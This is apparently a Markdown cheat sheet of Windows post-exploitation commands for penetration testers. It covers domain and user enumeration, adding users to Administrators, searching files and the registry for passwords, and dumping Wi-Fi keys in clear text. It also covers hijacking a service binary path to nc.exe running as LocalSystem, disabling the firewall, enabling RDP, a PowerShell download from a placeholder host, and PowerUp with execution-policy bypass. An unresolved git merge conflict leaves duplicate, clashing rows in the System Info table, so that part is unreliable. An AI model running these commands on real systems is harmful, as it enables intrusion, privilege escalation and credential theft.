### Windows Net and Group Commands

| Command                    | Description                               |
| -------------------------  | ------------------------------------------------  |
| net use  					 |  View remote connections    |
| net use \\host /u:user pass |  Add a remote connection    |
| net view /domain           | Hosts in current domain  |
| net user /domain           | All users in current domain |
| net user user pass /add    |    Create a new user with password (Password should comply with security policy)    |
| net localgroup "Administrators" user /add  | Add user to Administrators  |
| net accounts /domain        | Domain password policy   |
| net localgroup "Group"      |  List users from local group   |
| net group /domain           |  List domain groups    |
| net group "Domain group" /domain   |  List domain groups    |
| net config workstation   |  View the domain name of current machine   |
| net config server   |  View the domain name of current server   |


### System Info Commands

| Command                    | Description                               |
| -------------------------  | ------------------------------------------------  |
| systeminfo                            | Show System info  |
| systeminfo /S ip /U domain\user /P Pwd | Remote system info |
| tasklist /svc 							| Show processes & services   |
| tasklist /m 							| Show all processes & DLLs   |
| tasklist /v 							| Shows proccess owning user   |
| tasklist /S ip /v 						| Remote process listing  |
| dir /a /s /b c:\'.pdf' 				| Search for files by extension  |
<<<<<<< HEAD
| sc query state= all 					| Show services  |
| findstr /si 'password' .txt   			| Search files for password   |

=======
| sc query					| Show services  |
| sc qc Spooler					| Show specifc service info (include binary path and running use)  |
| findstr /si password' .txt   			| Search files for password   |
|dir /s *pass* == *cred* == *vnc* == *.config* | Search for sensitive file names |
|sc config upnphost binpath= "C:\nc.exe" | Change binary path of service |
|sc config upnphost obj= ".\LocalSystem" password= ""| change permission of service to system|
|accesschk.exe -ucqv "Authenticated Users" * /accepteula| check services permissions (accesschk is a sysinternals tool)|
|accesschk.exe -ucqv ServceName /accepteula | check permission of a given service by name (accesschk is a sysinternals tool)|
|accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula| Check file write permissions for a group|
>>>>>>> aea7793beb497061a34f97b8bd0e2acff35d8961
### Networking

| Command                    | Description                               |
| -------------------------  | ------------------------------------------------  |
| route print                            | prints routing table  |
| netsh wlan export profile folder=. key=clear                             | Dumps all Wifi passwords to files when admin|
| netsh advfirewall set currentprofile state off | Disable Firewall. use allprofiles for all profiles  |
| Set port forwarding  | netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2   |

### Enable remote desktop

| Command                    | Description                               |
| -------------------------  | ------------------------------------------------  |
| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f    | Enable remote desktop  |
| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f | Enable remote assistance |
| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 12345 /f | Change RDP port (usefull when firewalled) |

### Registry
| Command                    | Description                               |
| -------------------------  | ------------------------------------------------ |
|reg query HKLM /f password /t REG_SZ /s | Search passwords in registry|
|reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" | winlogon entry|

### PowerShell

| Command                    | Description                               |
| -------------------------  | ------------------------------------------------  |
| powershell -c "(new-object System.Net.WebClient).DownloadFile('http://blabla.com/test.txt','C:\Users\admin\Desktop\test.test')"| Download file  |
| Get-Service I where object {$ .status -eq ''Running''}  | List running services |
| powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}” | run all PowerUp checks from Meterpreter|

### Compiling
To compile a C# project as binary

1. cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

to compile as x86 binary
2.1 csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:<out_file_name> /platform:x86 "/cs/files/dir/*.cs"

to complie as x64
2.2 csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:<out_file_name> /platform:x64 "/cs/files/dir/*.cs"

Example:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319>csc.exe /unsafe /reference:"c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\Users\admin\Desktop\PowerOPS_x86.exe /platform:x86 "C:\Users\admin\Downloads\PowerOPS-master\PowerOPS-master\PowerOPS\*.cs"